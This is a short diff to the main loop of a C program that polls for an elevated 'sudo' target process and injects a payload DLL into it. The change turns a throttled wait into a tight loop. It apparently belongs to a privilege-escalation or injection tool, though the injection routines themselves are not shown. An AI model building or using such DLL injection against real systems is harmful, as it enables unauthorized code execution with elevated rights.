@@ -17,12 +17,12 @@ int main(int argc, char **argv) {
 	}
 
 	printf("Going to inject %s\n", payload);
+	printf("Finding target process...\n");
 
 	HANDLE target_handle = NULL;
 	while (target_handle == NULL) {
-		printf("Finding target process...\n");
 		target_handle = find_sudo_target();
-		Sleep(200);
+		// Sleep(200);
 	}
 	printf("Injecting DLL, process handle %p\n", target_handle);
 	inject_dll(target_handle, payload);
